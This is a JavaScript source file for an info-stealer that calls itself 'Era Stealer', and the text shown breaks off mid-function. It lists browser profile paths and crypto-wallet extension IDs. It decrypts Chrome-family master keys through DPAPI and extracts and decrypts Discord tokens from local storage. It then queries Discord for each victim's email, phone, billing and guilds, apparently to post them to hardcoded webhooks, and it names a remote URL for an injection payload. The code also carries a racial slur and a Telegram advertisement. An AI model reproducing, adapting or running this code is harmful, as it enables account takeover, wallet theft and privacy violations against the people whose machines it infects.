const fs = require("fs");
const path = require("path");
const httpx = require("axios");
const axios = require("axios");
const os = require("os");
const FormData = require("form-data");
const AdmZip = require("adm-zip");
const { execSync, exec } = require("child_process");
const crypto = require("crypto");
const sqlite3 = require("sqlite3");
const { Dpapi } = require("@primno/dpapi");
let injection_paths = [];

const local = process.env.LOCALAPPDATA;
const discords = [];

var appdata = process.env.APPDATA,
  LOCAL = process.env.LOCALAPPDATA,
  localappdata = process.env.LOCALAPPDATA;
let browser_paths = [
  localappdata + "\\Google\\Chrome\\User Data\\Default\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\",
  localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\",
  localappdata + "\\Google\\Chrome\\User Data\\Default\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\Network\\",
  appdata + "\\Opera Software\\Opera Stable\\",
  appdata + "\\Opera Software\\Opera GX Stable\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Default\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\",
];

const injection_url =
  "https://raw.githubusercontent.com/xSalca/Viral/main/index.js";

const webhook =
"https://discord.com/api/webhooks/1333842800093040701/SKKymfPjmJzlcjSm5ZdPMqPz6AXuf-b-Umahtr7-vneLpgkrQk4UZ1CVpdHL5C2RFKvv"

const username = "Era Stealer";

const hihi =
  "https://discord.com/api/webhooks/1333846223496548413/266IyNN-0afAIPicclJ8b4YpZfybmyOcW4iM5nE3UrDMBwRAj8SZ91TJWJud8gSDp7-J";

const avatar_url =
  "https://cdn.discordapp.com/attachments/1329073689907560499/1333804141545263199/era.jpg?ex=679a3968&is=6798e7e8&hm=627edebd37fde5428a8638466cff6c79b13cf148379447565de10600191735e3&";

const maxRetries = 2;
let retryCount = 0;

paths = [
  appdata + "\\discord\\",
  appdata + "\\discordcanary\\",
  appdata + "\\discordptb\\",
  appdata + "\\discorddevelopment\\",
  appdata + "\\lightcord\\",
  localappdata + "\\Google\\Chrome\\User Data\\Default\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\",
  localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\",
  localappdata + "\\Google\\Chrome\\User Data\\Default\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\Network\\",
  localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\Network\\",
  appdata + "\\Opera Software\\Opera Stable\\",
  appdata + "\\Opera Software\\Opera GX Stable\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\",
  localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Default\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\",
  localappdata +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\",
  localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\",
  localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\",
];

function onlyUnique(item, index, array) {
  return array.indexOf(item) === index;
}

const _0x9b6227 = {};
_0x9b6227.passwords = 0;
_0x9b6227.cookies = 0;
_0x9b6227.autofills = 0;
_0x9b6227.wallets = 0;
_0x9b6227.telegram = false;
const count = _0x9b6227,
  user = {
    ram: os.totalmem(),
    version: os.version(),
    uptime: os.uptime,
    homedir: os.homedir(),
    hostname: os.hostname(),
    userInfo: os.userInfo().username,
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    countCore: process.env.NUMBER_OF_PROCESSORS,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
    randomUUID: crypto.randomBytes(16).toString("hex"),
    start: Date.now(),
    debug: false,
    copyright: "",
    url: null,
  };
_0x2afdce = {};
const walletPaths = _0x2afdce,
  _0x4ae424 = {};
_0x4ae424.Trust =
  "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph";
_0x4ae424.Metamask =
  "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn";
_0x4ae424.Coinbase =
  "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad";
_0x4ae424.BinanceChain =
  "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp";
_0x4ae424.Phantom =
  "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa";
_0x4ae424.TronLink =
  "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec";
_0x4ae424.Ronin =
  "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec";
_0x4ae424.Exodus =
  "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno";
_0x4ae424.Coin98 =
  "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg";
_0x4ae424.Authenticator =
  "\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai";
_0x4ae424.MathWallet =
  "\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc";
_0x4ae424.YoroiWallet =
  "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb";
_0x4ae424.GuardaWallet =
  "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln";
_0x4ae424.JaxxxLiberty =
  "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne";
_0x4ae424.Wombat =
  "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih";
_0x4ae424.EVERWallet =
  "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk";
_0x4ae424.KardiaChain =
  "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk";
_0x4ae424.XDEFI =
  "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf";
_0x4ae424.Nami = "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo";
_0x4ae424.TerraStation =
  "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp";
_0x4ae424.MartianAptos =
  "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk";
_0x4ae424.TON = "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd";
_0x4ae424.Keplr =
  "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap";
_0x4ae424.CryptoCom =
  "\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj";
_0x4ae424.PetraAptos =
  "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci";
_0x4ae424.OKX = "\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge";
_0x4ae424.Sollet =
  "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno";
_0x4ae424.Sender =
  "\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg";
_0x4ae424.Sui = "\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil";
_0x4ae424.SuietSui =
  "\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd";
_0x4ae424.Braavos =
  "\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma";
_0x4ae424.FewchaMove =
  "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj";
_0x4ae424.EthosSui =
  "\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli";
_0x4ae424.ArgentX =
  "\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb";
_0x4ae424.NiftyWallet =
  "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid";
_0x4ae424.BraveWallet =
  "\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl";
_0x4ae424.EqualWallet =
  "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac";
_0x4ae424.BitAppWallet =
  "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi";
_0x4ae424.iWallet =
  "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj";
_0x4ae424.AtomicWallet =
  "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh";
_0x4ae424.MewCx =
  "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm";
_0x4ae424.GuildWallet =
  "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj";
_0x4ae424.SaturnWallet =
  "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig";
_0x4ae424.HarmonyWallet =
  "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib";
_0x4ae424.PaliWallet =
  "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn";
_0x4ae424.BoltX =
  "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca";
_0x4ae424.LiqualityWallet =
  "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn";
_0x4ae424.MaiarDeFiWallet =
  "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm";
_0x4ae424.TempleWallet =
  "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc";
_0x4ae424.Metamask_E =
  "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm";
_0x4ae424.Ronin_E =
  "\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk";
_0x4ae424.Yoroi_E =
  "\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb";
_0x4ae424.Authenticator_E =
  "\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio";
_0x4ae424.MetaMask_O =
  "\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci";

const extension = _0x4ae424,
  browserPath = [
    [
      user.local + "\\Google\\Chrome\\User Data\\Default\\",
      "Default",
      user.local + "\\Google\\Chrome\\User Data\\",
    ],
    [
      user.local + "\\Google\\Chrome\\User Data\\Profile 1\\",
      "Profile_1",
      user.local + "\\Google\\Chrome\\User Data\\",
    ],
    [
      user.local + "\\Google\\Chrome\\User Data\\Profile 2\\",
      "Profile_2",
      user.local + "\\Google\\Chrome\\User Data\\",
    ],
    [
      user.local + "\\Google\\Chrome\\User Data\\Profile 3\\",
      "Profile_3",
      user.local + "\\Google\\Chrome\\User Data\\",
    ],
    [
      user.local + "\\Google\\Chrome\\User Data\\Profile 4\\",
      "Profile_4",
      user.local + "\\Google\\Chrome\\User Data\\",
    ],
    [
      user.local + "\\Google\\Chrome\\User Data\\Profile 5\\",
      "Profile_5",
      user.local + "\\Google\\Chrome\\User Data\\",
    ],
    [
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
      "Default",
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\",
    ],
    [
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\",
      "Profile_1",
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\",
    ],
    [
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\",
      "Profile_2",
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\",
    ],
    [
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\",
      "Profile_3",
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\",
    ],
    [
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\",
      "Profile_4",
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\",
    ],
    [
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\",
      "Profile_5",
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\",
    ],
    [
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\",
      "Guest Profile",
      user.local + "\\BraveSoftware\\Brave-Browser\\User Data\\",
    ],
    [
      user.local + "\\Yandex\\YandexBrowser\\User Data\\Default\\",
      "Default",
      user.local + "\\Yandex\\YandexBrowser\\User Data\\",
    ],
    [
      user.local + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\",
      "Profile_1",
      user.local + "\\Yandex\\YandexBrowser\\User Data\\",
    ],
    [
      user.local + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\",
      "Profile_2",
      user.local + "\\Yandex\\YandexBrowser\\User Data\\",
    ],
    [
      user.local + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\",
      "Profile_3",
      user.local + "\\Yandex\\YandexBrowser\\User Data\\",
    ],
    [
      user.local + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\",
      "Profile_4",
      user.local + "\\Yandex\\YandexBrowser\\User Data\\",
    ],
    [
      user.local + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\",
      "Profile_5",
      user.local + "\\Yandex\\YandexBrowser\\User Data\\",
    ],
    [
      user.local + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\",
      "Guest Profile",
      user.local + "\\Yandex\\YandexBrowser\\User Data\\",
    ],
    [
      user.local + "\\Microsoft\\Edge\\User Data\\Default\\",
      "Default",
      user.local + "\\Microsoft\\Edge\\User Data\\",
    ],
    [
      user.local + "\\Microsoft\\Edge\\User Data\\Profile 1\\",
      "Profile_1",
      user.local + "\\Microsoft\\Edge\\User Data\\",
    ],
    [
      user.local + "\\Microsoft\\Edge\\User Data\\Profile 2\\",
      "Profile_2",
      user.local + "\\Microsoft\\Edge\\User Data\\",
    ],
    [
      user.local + "\\Microsoft\\Edge\\User Data\\Profile 3\\",
      "Profile_3",
      user.local + "\\Microsoft\\Edge\\User Data\\",
    ],
    [
      user.local + "\\Microsoft\\Edge\\User Data\\Profile 4\\",
      "Profile_4",
      user.local + "\\Microsoft\\Edge\\User Data\\",
    ],
    [
      user.local + "\\Microsoft\\Edge\\User Data\\Profile 5\\",
      "Profile_5",
      user.local + "\\Microsoft\\Edge\\User Data\\",
    ],
    [
      user.local + "\\Microsoft\\Edge\\User Data\\Guest Profile\\",
      "Guest Profile",
      user.local + "\\Microsoft\\Edge\\User Data\\",
    ],
    [
      user.roaming + "\\Opera Software\\Opera Neon\\User Data\\Default\\",
      "Default",
      user.roaming + "\\Opera Software\\Opera Neon\\User Data\\",
    ],
    [
      user.roaming + "\\Opera Software\\Opera Stable\\",
      "Default",
      user.roaming + "\\Opera Software\\Opera Stable\\",
    ],
    [
      user.roaming + "\\Opera Software\\Opera GX Stable\\",
      "Default",
      user.roaming + "\\Opera Software\\Opera GX Stable\\",
    ],
  ],
  randomPath = `${user.fileLoc}\\erastealer`;
try {
  fs.mkdirSync(randomPath, 484);
} catch {}

async function getEncrypted() {
  for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
    if (!fs.existsSync("" + browserPath[_0x4c3514][0])) {
      continue;
    }
    try {
      let _0x276965 = Buffer.from(
        JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + "Local State"))
          .os_crypt.encrypted_key,
        "base64"
      ).slice(5);
      const _0x4ff4c6 = Array.from(_0x276965),
        _0x4860ac = execSync(
          "powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(" +
            _0x4ff4c6 +
            "), $null, 'CurrentUser')"
        )
          .toString()
          .split("\r\n"),
        _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ""),
        _0x2ed7ba = Buffer.from(_0x4a5920);
      browserPath[_0x4c3514].push(_0x2ed7ba);
    } catch (_0x32406b) {}
  }
}

function addFolder(folderPath) {
  const folderFullPath = path.join(randomPath, folderPath);
  if (!fs.existsSync(folderFullPath)) {
    try {
      fs.mkdirSync(folderFullPath, { recursive: true });
    } catch (error) {}
  }
}

async function getZipp(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip("" + zipFilePath);
  } catch (error) {}
}

function getZip(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip("" + zipFilePath);
  } catch (error) {}
}

function copyFolder(sourcePath, destinationPath) {
  const isDestinationExists = fs.existsSync(destinationPath);
  const destinationStats = isDestinationExists && fs.statSync(destinationPath);
  const isDestinationDirectory =
    isDestinationExists && destinationStats.isDirectory();

  if (isDestinationDirectory) {
    addFolder(sourcePath);

    fs.readdirSync(destinationPath).forEach((file) => {
      const sourceFile = path.join(sourcePath, file);
      const destinationFile = path.join(destinationPath, file);
      copyFolder(sourceFile, destinationFile);
    });
  } else {
    fs.copyFileSync(destinationPath, path.join(randomPath, sourcePath));
  }
}

const decryptKey = (localState) => {
  const encryptedKey = JSON.parse(fs.readFileSync(localState, "utf8")).os_crypt
    .encrypted_key;
  const encrypted = Buffer.from(encryptedKey, "base64").slice(5);
  return Dpapi.unprotectData(
    Buffer.from(encrypted, "utf8"),
    null,
    "CurrentUser"
  );
};

function findTokenn(path) {
  path += "Local Storage\\leveldb";
  let tokens = [];
  try {
    fs.readdirSync(path).map((file) => {
      (file.endsWith(".log") || file.endsWith(".ldb")) &&
        fs
          .readFileSync(path + "\\" + file, "utf8")
          .split(/\r?\n/)
          .forEach((line) => {
            const patterns = [
              new RegExp(/mfa\.[\w-]{84}/g),
              new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm),
              new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g),
            ];
            for (const pattern of patterns) {
              const foundTokens = line.match(pattern);
              if (foundTokens)
                foundTokens.forEach((token) => tokens.push(token));
            }
          });
    });
  } catch (e) {}
  return tokens;
}

async function createZipp(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip(zipPath, (err) => {
      if (err) {
        reject(err);
      } else {
        resolve();
      }
    });
  });
}

async function getZippp() {
  getZipp(randomPath, randomPath + ".zip");

  const filePath = "./" + "erastealer" + ".zip";

  const randomString = crypto.randomBytes(16).toString("hex");
}

const tokens = [];

async function findToken(path) {
  let path_tail = path;
  path += "Local Storage\\leveldb";

  if (!path_tail.includes("discord")) {
    try {
      fs.readdirSync(path).map((file) => {
        (file.endsWith(".log") || file.endsWith(".ldb")) &&
          fs
            .readFileSync(path + "\\" + file, "utf8")
            .split(/\r?\n/)
            .forEach((line) => {
              const patterns = [
                new RegExp(/mfa\.[\w-]{84}/g),
                new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm),
                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g),
              ];
              for (const pattern of patterns) {
                const foundTokens = line.match(pattern);
                if (foundTokens)
                  foundTokens.forEach((token) => {
                    if (!tokens.includes(token)) tokens.push(token);
                  });
              }
            });
      });
    } catch (e) {}
    return;
  } else {
    if (fs.existsSync(path_tail + "\\Local State")) {
      try {
        const tokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;

        fs.readdirSync(path).forEach((file) => {
          if (file.endsWith(".log") || file.endsWith(".ldb")) {
            const fileContent = fs.readFileSync(`${path}\\${file}`, "utf8");
            const lines = fileContent.split(/\r?\n/);

            const localStatePath = path_tail + "Local State";
            const key = decryptKey(localStatePath);

            lines.forEach((line) => {
              const foundTokens = line.match(tokenRegex);
              if (foundTokens) {
                foundTokens.forEach((token) => {
                  let decrypted;
                  const encryptedValue = Buffer.from(
                    token.split(":")[1],
                    "base64"
                  );
                  const start = encryptedValue.slice(3, 15);
                  const middle = encryptedValue.slice(
                    15,
                    encryptedValue.length - 16
                  );
                  const end = encryptedValue.slice(
                    encryptedValue.length - 16,
                    encryptedValue.length
                  );
                  const decipher = crypto.createDecipheriv(
                    "aes-256-gcm",
                    key,
                    start
                  );
                  decipher.setAuthTag(end);
                  decrypted =
                    decipher.update(middle, "base64", "utf8") +
                    decipher.final("utf8");
                  if (!tokens.includes(decrypted)) tokens.push(decrypted);
                });
              }
            });
          }
        });
      } catch (e) {}
      return;
    }
  }
}

async function stealTokens() {
  for (let path of paths) {
    await findToken(path);
  }

  for (let token of tokens) {
    try {
      let json;
      await axios
        .get("https://discord.com/api/v6/users/@me", {
          headers: {
            "Content-Type": "application/json",
            authorization: token,
          },
        })
        .then((res) => {
          json = res.data;
        })
        .catch(() => {
          json = null;
        });
      if (!json) continue;
      var ip = await getIp();
      var billing = await getBilling(token);
      var { description, totalFriends } = await getHQFriends(token);
      var { totalGuilds, guildList } = await getHQGuilds(token);

      const randomString = crypto.randomBytes(16).toString("hex");
      const total_memory = os.totalmem();
      const total_mem_in_kb = total_memory / 1024;
      const total_mem_in_mb = total_mem_in_kb / 1024;
      const total_mem_in_gb = total_mem_in_mb / 1024;
      const total_mem_in_gb_fixed = total_mem_in_gb.toFixed(1);
      const badgeEmojis = await getBadges(token);
      const tokenid = await getID(token);
      const boostLevel = await getBoostLevel(tokenid, token);
      const badgeString = Array.isArray(badgeEmojis)
        ? badgeEmojis.join(" ")
        : badgeEmojis;
      const boostEmoji = boostLevels[boostLevel];
      const nitroEmoji = await getNitroEmote(json.premium_type, json.id, token);

      const userInformationEmbed = {
        color: 0x000,
        author: {
          name: `${json.username} | ${json.id}`,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`,
        },
        thumbnail: {
          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`,
        },
        fields: [
          {
            name: "<a:crown:1240635323671773258> Token:",
            value: `\`\`\`${token}\`\`\``,
          },
          {
            name: "<a:diamond:1240636957843783700> Badges:",
            value: `${badgeString} ${nitroEmoji} ${boostEmoji}`,
            inline: true,
          },
          {
            name: "<:trident:1240636497250484275> Nitro Type:",
            value: await getNitro(json.premium_type, json.id, token),
            inline: true,
          },
          {
            name: "<:billing:1240636353364889700> Billing:",
            value: billing,
            inline: true,
          },

          {
            name: "<a:drag:1240636089258086461> Email:",
            value: `\`${json.email}\``,
            inline: true,
          },
          {
            name: "<a:world:1240635322170343444> Phone",
            value: `\`${json.phone}\``,
            inline: true,
          },
        ],
        footer: {
          text: "Era stealer & https://t.me/era_stealer",
          icon_url: `https://cdn.discordapp.com/avatars/1258711833800609837/72564c98be57b45f733245a8e7907a2c.webp?size=1024&format=webp`,
        },
      };

      const guildsEmbed = {
        color: 0x000,
        description:
          guildList !== ""
            ? guildList
            : `- <a:crown:1240635323671773258> **This nigga doesn't have any HQ guilds**`,
        author: {
          name: `HQ Guilds | Total Guilds: ${totalGuilds}`,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`,
        },
        footer: {
          text: "Era stealer & https://t.me/era_stealer",
          icon_url:
